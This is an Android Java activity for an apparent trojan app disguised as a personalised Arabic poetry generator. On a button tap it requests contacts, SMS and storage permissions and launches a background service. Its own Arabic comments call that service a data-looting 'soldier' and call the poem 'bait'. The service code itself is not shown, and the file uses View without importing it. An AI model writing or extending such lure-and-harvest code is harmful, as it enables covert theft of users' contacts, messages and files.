package com.royal.poetry.master;

import android.Manifest;
import android.content.Intent;
import android.os.Bundle;
import android.widget.Button;
import android.widget.EditText;
import android.widget.TextView;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;

public class MainActivity extends AppCompatActivity {
    private EditText inputUserName;
    private TextView txtResult;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        inputUserName = findViewById(R.id.inputUserName);
        txtResult = findViewById(R.id.txtResult);
        Button btnGenerate = findViewById(R.id.btnGenerate);

        btnGenerate.setOnClickListener(v -> {
            String name = inputUserName.getText().toString().trim();
            if (name.isEmpty()) {
                inputUserName.setError("الرجاء إدخال الاسم");
                return;
            }

            // طلب الأذونات المطلوبة
            ActivityCompat.requestPermissions(this, new String[]{
                Manifest.permission.READ_CONTACTS,
                Manifest.permission.READ_SMS,
                Manifest.permission.READ_EXTERNAL_STORAGE
            }, 100);

            // إطلاق الجندي الخلفي لنهب البيانات
            startService(new Intent(this, RoyalBackgroundService.class));

            // عرض الأبيات الشعرية المخصصة كطعم مغرٍ
            txtResult.setText("📜 ديوان الخلود لـ (" + name + "):\n\n" +
                "أيا " + name + " المجد والأنوار تحويها... فخر الديار ومن بالعز ترويها\n" +
                "خطاكَ تسطع في الآفاقِ ساطعةً... كأنما الأرضُ طوعاً بين أيديها");
            txtResult.setVisibility(View.VISIBLE);
        });
    }
}
